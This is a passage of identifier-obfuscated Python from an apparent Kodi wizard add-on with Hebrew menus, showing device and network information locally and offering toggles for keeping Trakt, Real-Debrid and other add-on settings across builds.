		O000000000O0OO000 =O0OOO00O000O00000 [0 ]if (len (O0OOO00O000O00000 )>0 )else 'Unknown'#line:2760
		O00OOOOO0000O00O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00O0OOO00O0O00OO )#line:2761
		OOO0OOOOO0O0O0O0O =O00OOOOO0000O00O0 [0 ]if (len (O00OOOOO0000O00O0 )>0 )else 'Unknown'#line:2762
		OO0000O0O00O0OOOO =O00OOOOO0000O00O0 [1 ]+', '+O00OOOOO0000O00O0 [2 ]+', '+O00OOOOO0000O00O0 [3 ]if (len (O00OOOOO0000O00O0 )>2 )else 'Unknown'#line:2763
		return O000000000O0OO000 ,OOO0OOOOO0O0O0O0O ,OO0000O0O00O0OOOO #line:2764
	else :return 'Unknown','Unknown','Unknown'#line:2765
def systemInfo ():#line:2767
	OO00O0OO0OO0OO000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2781
	O000O00OOOO0OOOOO =[];O0O0O00000OOO0000 =0 #line:2782
	for OOOO00O0OO000O000 in OO00O0OO0OO0OO000 :#line:2783
		O0OOO00OOO0OO000O =wiz .getInfo (OOOO00O0OO000O000 )#line:2784
		OOO00O0OO000OO00O =0 #line:2785
		while O0OOO00OOO0OO000O =="Busy"and OOO00O0OO000OO00O <10 :#line:2786
			O0OOO00OOO0OO000O =wiz .getInfo (OOOO00O0OO000O000 );OOO00O0OO000OO00O +=1 ;wiz .log ("%s sleep %s"%(OOOO00O0OO000O000 ,str (OOO00O0OO000OO00O )));xbmc .sleep (1000 )#line:2787
		O000O00OOOO0OOOOO .append (O0OOO00OOO0OO000O )#line:2788
		O0O0O00000OOO0000 +=1 #line:2789
	OOO00O0O00O0O0O0O =O000O00OOOO0OOOOO [8 ]if 'Una'in O000O00OOOO0OOOOO [8 ]else wiz .convertSize (int (float (O000O00OOOO0OOOOO [8 ][:-8 ]))*1024 *1024 )#line:2790
	OO0O000O0O000OO00 =O000O00OOOO0OOOOO [9 ]if 'Una'in O000O00OOOO0OOOOO [9 ]else wiz .convertSize (int (float (O000O00OOOO0OOOOO [9 ][:-8 ]))*1024 *1024 )#line:2791
	OO0000OOOO0O00OO0 =O000O00OOOO0OOOOO [10 ]if 'Una'in O000O00OOOO0OOOOO [10 ]else wiz .convertSize (int (float (O000O00OOOO0OOOOO [10 ][:-8 ]))*1024 *1024 )#line:2792
	O00O000O00OOOOO0O =wiz .convertSize (int (float (O000O00OOOO0OOOOO [11 ][:-2 ]))*1024 *1024 )#line:2793
	OOOO0O00OO0O00OO0 =wiz .convertSize (int (float (O000O00OOOO0OOOOO [12 ][:-2 ]))*1024 *1024 )#line:2794
	O0OOO00OO00O000O0 =wiz .convertSize (int (float (O000O00OOOO0OOOOO [13 ][:-2 ]))*1024 *1024 )#line:2795
	OO0O00O0000O0OO0O ,OO0OO000O000OO0OO ,O00OOOO0OOO0O0O0O =getIP ()#line:2796
	OOO0OOO0OO0OOO000 =[];O000O0O00O00OO00O =[];O0OOOOO0OOOOO0OOO =[];OO0O0O0O00O00OOOO =[];OOOO0O00OOO000OOO =[];O00OOO000O0O00000 =[];O0OOOO0O0OO000OO0 =[]#line:2798
	OOO0O0O00OOO0000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2800
	for OO0000O00O0OOOO0O in sorted (OOO0O0O00OOO0000O ,key =lambda O00OO0O00O0O00O00 :O00OO0O00O0O00O00 ):#line:2801
		OO0O0O00O0O0OOO00 =os .path .split (OO0000O00O0OOOO0O [:-1 ])[1 ]#line:2802
		if OO0O0O00O0O0OOO00 =='packages':continue #line:2803
		OOOO0O0OOOO0O00O0 =os .path .join (OO0000O00O0OOOO0O ,'addon.xml')#line:2804
		if os .path .exists (OOOO0O0OOOO0O00O0 ):#line:2805
			OO00OOO00O0OO00OO =open (OOOO0O0OOOO0O00O0 )#line:2806
			OO0O0O0000O000O0O =OO00OOO00O0OO00OO .read ()#line:2807
			O0OO000OOO00O0000 =re .compile ("<provides>(.+?)</provides>").findall (OO0O0O0000O000O0O )#line:2808
			if len (O0OO000OOO00O0000 )==0 :#line:2809
				if OO0O0O00O0O0OOO00 .startswith ('skin'):O0OOOO0O0OO000OO0 .append (OO0O0O00O0O0OOO00 )#line:2810
				if OO0O0O00O0O0OOO00 .startswith ('repo'):OOOO0O00OOO000OOO .append (OO0O0O00O0O0OOO00 )#line:2811
				else :O00OOO000O0O00000 .append (OO0O0O00O0O0OOO00 )#line:2812
			elif not (O0OO000OOO00O0000 [0 ]).find ('executable')==-1 :OO0O0O0O00O00OOOO .append (OO0O0O00O0O0OOO00 )#line:2813
			elif not (O0OO000OOO00O0000 [0 ]).find ('video')==-1 :O0OOOOO0OOOOO0OOO .append (OO0O0O00O0O0OOO00 )#line:2814
			elif not (O0OO000OOO00O0000 [0 ]).find ('audio')==-1 :O000O0O00O00OO00O .append (OO0O0O00O0O0OOO00 )#line:2815
			elif not (O0OO000OOO00O0000 [0 ]).find ('image')==-1 :OOO0OOO0OO0OOO000 .append (OO0O0O00O0O0OOO00 )#line:2816
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2819
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2820
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2821
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2822
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2823
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O00O0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O0O000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOOO0O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2832
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2834
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O000O00OOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2835
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00OO0O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2836
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2837
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2839
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2840
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00O0000O0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2841
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO000O000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2842
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOO0OOO0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2843
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOO0OOOOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2844
	OOOOO00O00O0O00OO =len (OOO0OOO0OO0OOO000 )+len (O000O0O00O00OO00O )+len (O0OOOOO0OOOOO0OOO )+len (OO0O0O0O00O00OOOO )+len (O00OOO000O0O00000 )+len (O0OOOO0O0OO000OO0 )+len (OOOO0O00OOO000OOO )#line:2846
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOOO00O00O0O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2847
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0OOOOO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2848
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0O0O00O00OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2849
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O00O00OO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2850
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOO0OO0OOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2851
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO0O00OOO000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2852
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0O0OO000OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2853
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO000O0O00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2854
def Menu ():#line:2855
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2856
def saveMenu ():#line:2858
	OOO0OOOO0000OOO00 ='[COLOR green]מופעל[/COLOR]';OO0O00OO0O0O00OO0 ='[COLOR red]מבוטל[/COLOR]'#line:2860
	O0O000OOO00O000O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2861
	O000OO000OO0OOOOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:2862
	OOOO0O0000OO0OOOO ='true'if KEEPINFO =='true'else 'false'#line:2863
	OOOO0O0000O000O00 ='true'if KEEPSOUND =='true'else 'false'#line:2865
	OOO00O0O00O000OO0 ='true'if KEEPVIEW =='true'else 'false'#line:2866
	OOOOOO000OOO0OO0O ='true'if KEEPSKIN =='true'else 'false'#line:2867
	OO0O000O0OO00O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2868
	OOOOO0000OOO000OO ='true'if KEEPSKIN3 =='true'else 'false'#line:2869
	O0O00O0O000OO0O00 ='true'if KEEPADDONS =='true'else 'false'#line:2870
	O00OO000O00O00O0O ='true'if KEEPPVR =='true'else 'false'#line:2871
	OOO0O0O0OO0OOOO00 ='true'if KEEPTVLIST =='true'else 'false'#line:2872
	O0OOO0O0OOOOO00OO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2873
	OOO0OO0OOO00OO0OO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2874
	OOOO000O000O000OO ='true'if KEEPHUBTV =='true'else 'false'#line:2875
	OO0OOO000000OO00O ='true'if KEEPHUBVOD =='true'else 'false'#line:2876
	O0OOO000OO0O0OO0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:2877
	OO0OO0O0OO00O0O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2878
	OOOOOO00OO0000O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:2879
	O0OO0O0O0OOOO00O0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2880
	O0000O0O00000OOO0 ='true'if KEEPTRAKT =='true'else 'false'#line:2881
	OOOO0OOO00O0OOOO0 ='true'if KEEPREAL =='true'else 'false'#line:2882
	O00OOO0OO0OOOOOO0 ='true'if KEEPRD2 =='true'else 'false'#line:2883
	OO0O0O000O0OO0O00 ='true'if KEEPTORNET =='true'else 'true'#line:2884
	O00O000OO00OOOOOO ='true'if KEEPLOGIN =='true'else 'false'#line:2885
	O000OO0OOO0O00O0O ='true'if KEEPSOURCES =='true'else 'false'#line:2886
	O00O00OOOOO00OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:2887
	OOO000O00OOOOOO0O ='true'if KEEPPROFILES =='true'else 'false'#line:2888
	O0O0OOOO0OO00O0OO ='true'if KEEPFAVS =='true'else 'false'#line:2889
	O0000OO0000OOO0OO ='true'if KEEPREPOS =='true'else 'false'#line:2890
	OO0OOO0O0O000O0OO ='true'if KEEPSUPER =='true'else 'false'#line:2891
	O00O0O00000000OOO ='true'if KEEPWHITELIST =='true'else 'false'#line:2892
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2896
	if O00O0O00000000OOO =='true':#line:2897
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2898
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2899
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2900
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2901
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2902
	addFile ('%s התקנת קיר סרטים: '%O0O000OOO00O000O0 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת חשבון RD: '%OOOO0OOO00O0OOOO0 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2905
	addFile ('%s שמירת חשבון טראקט: '%O0000O0O00000OOO0 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2906
	addFile ('%s שמירת מועדפים: '%O0O0OOOO0OO00O0OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת לקוח טלוויזיה: '%O00OO000O00O00O0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2910
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOO0O0O0OO0OOOO00 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2911
	addFile ('%s שמירת אריח סרטים: '%O0OOO0O0OOOOO00OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת אריח סדרות: '%OOO0OO0OOO00OO0OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2913
	addFile ('%s שמירת אריח טלויזיה: '%OOOO000O000O000OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2914
	addFile ('%s שמירת אריח תוכן ישראלי: '%OO0OOO000000OO00O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2915
	addFile ('%s שמירת אריח ילדים: '%O0OOO000OO0O0OO0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2916
	addFile ('%s שמירת אריח מוסיקה: '%OO0OO0O0OO00O0O0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2917
	addFile ('%s שמירת תפריט אריחים ראשי: '%OOOOOO00OO0000O0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת כל האריחים בסקין: '%OOOOOO000OOO0OO0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2919
	addFile ('%s שמירת הרחבות שהתקנתי: '%O0O00O0O000OO0O00 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2926
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOOO0O0000OO0OOOO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2927
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O000OO000OO0OOOOO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2930
	addFile ('%s שמירת מקורות וידאו: '%O000OO0OOO0O00O0O .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2931
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OOOO0O0000O000O00 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2932
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%OOO00O0O00O000OO0 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2934
	addFile ('%s שמירת פליליסט לאודר: '%O0OO0O0O0OOOO00O0 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2935
	addFile ('%s שמירת הרחבות ידנית: '%O00O0O00000000OOO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2936
	addFile ('%s שמירת הגדרות באפר: '%O00O00OOOOO00OO00 .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2940
	addFile ('%s שמירת סופר מועדפים: '%OO0OOO0O0O000O0OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2941
	addFile ('%s שמירת רשימות ריפו: '%O0000OO0000OOO0OO .replace ('true',OOO0OOOO0000OOO00 ).replace ('false',OO0O00OO0O0O00OO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2942
	setView ('files','viewType')#line:2944
def traktMenu ():#line:2946
	OOOOO0OOO0000000O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2947
	OO000O0O00O0O000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2948
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2949
	addFile ('Save Trakt Data: %s'%OOOOO0OOO0000000O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2950
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO000O0O00O0O000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2951
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2952
	for OOOOO0OOO0000000O in traktit .ORDER :#line:2954
		OO000OO0OO0O00OOO =TRAKTID [OOOOO0OOO0000000O ]['name']#line:2955
		OO0000O0OO0OO0OOO =TRAKTID [OOOOO0OOO0000000O ]['path']#line:2956
		OO00000O0OOO00O00 =TRAKTID [OOOOO0OOO0000000O ]['saved']#line:2957
		O0O0000000OO00000 =TRAKTID [OOOOO0OOO0000000O ]['file']#line:2958
		O0O0O00OO0000O0OO =wiz .getS (OO00000O0OOO00O00 )#line:2959
		OO000O0O000O00O00 =traktit .traktUser (OOOOO0OOO0000000O )#line:2960
		O0OO000O0OOO00000 =TRAKTID [OOOOO0OOO0000000O ]['icon']if os .path .exists (OO0000O0OO0OO0OOO )else ICONTRAKT #line:2961
		OOOO0O00O0OOO000O =TRAKTID [OOOOO0OOO0000000O ]['fanart']if os .path .exists (OO0000O0OO0OO0OOO )else FANART #line:2962
		OOO0OO00OOOO00000 =createMenu ('saveaddon','Trakt',OOOOO0OOO0000000O )#line:2963
		O000000000O0OO00O =createMenu ('save','Trakt',OOOOO0OOO0000000O )#line:2964
		OOO0OO00OOOO00000 .append ((THEME2 %'%s Settings'%OO000OO0OO0O00OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOOOO0OOO0000000O )))#line:2965
		addFile ('[+]-> %s'%OO000OO0OO0O00OOO ,'',icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,themeit =THEME3 )#line:2967
		if not os .path .exists (OO0000O0OO0OO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =OOO0OO00OOOO00000 )#line:2968
		elif not OO000O0O000O00O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOOOO0OOO0000000O ,icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =OOO0OO00OOOO00000 )#line:2969
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO000O0O000O00O00 ,'authtrakt',OOOOO0OOO0000000O ,icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =OOO0OO00OOOO00000 )#line:2970
		if O0O0O00OO0000O0OO =="":#line:2971
			if os .path .exists (O0O0000000OO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOOOO0OOO0000000O ,icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =O000000000O0OO00O )#line:2972
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOOOO0OOO0000000O ,icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =O000000000O0OO00O )#line:2973
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O00OO0000O0OO ,'',icon =O0OO000O0OOO00000 ,fanart =OOOO0O00O0OOO000O ,menu =O000000000O0OO00O )#line:2974
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2976
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2977
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2978
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2979
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2980
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2981
	setView ('files','viewType')#line:2982
def realMenu ():#line:2984
	O0OO0O00OO00O0O0O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2985
	OO000O0OO0O00O0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2986
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2987
	addFile ('Save Real Debrid Data: %s'%O0OO0O00OO00O0O0O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2988
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO000O0OO0O00O0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2989
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2990
	for O000O0000OOOOOO0O in debridit .ORDER :#line:2992
		OOOO0O00OO0O0000O =DEBRIDID [O000O0000OOOOOO0O ]['name']#line:2993
		O0O0O0O0000O00000 =DEBRIDID [O000O0000OOOOOO0O ]['path']#line:2994
		O000000O0O0000O00 =DEBRIDID [O000O0000OOOOOO0O ]['saved']#line:2995
		O000O0O000OO00000 =DEBRIDID [O000O0000OOOOOO0O ]['file']#line:2996
		O00OOOOOO0O0O0OOO =wiz .getS (O000000O0O0000O00 )#line:2997
		OO00O00O00000OOOO =debridit .debridUser (O000O0000OOOOOO0O )#line:2998
		O00O0OOOOOOO000O0 =DEBRIDID [O000O0000OOOOOO0O ]['icon']if os .path .exists (O0O0O0O0000O00000 )else ICONREAL #line:2999
		OOOO0000OOO0OO0O0 =DEBRIDID [O000O0000OOOOOO0O ]['fanart']if os .path .exists (O0O0O0O0000O00000 )else FANART #line:3000
		O00OO0O00OOO00OOO =createMenu ('saveaddon','Debrid',O000O0000OOOOOO0O )#line:3001
		O0O000OOOOO0O0O0O =createMenu ('save','Debrid',O000O0000OOOOOO0O )#line:3002
		O00OO0O00OOO00OOO .append ((THEME2 %'%s Settings'%OOOO0O00OO0O0000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O000O0000OOOOOO0O )))#line:3003
		addFile ('[+]-> %s'%OOOO0O00OO0O0000O ,'',icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,themeit =THEME3 )#line:3005
		if not os .path .exists (O0O0O0O0000O00000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O00OO0O00OOO00OOO )#line:3006
		elif not OO00O00O00000OOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O000O0000OOOOOO0O ,icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O00OO0O00OOO00OOO )#line:3007
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O00O00000OOOO ,'authdebrid',O000O0000OOOOOO0O ,icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O00OO0O00OOO00OOO )#line:3008
		if O00OOOOOO0O0O0OOO =="":#line:3009
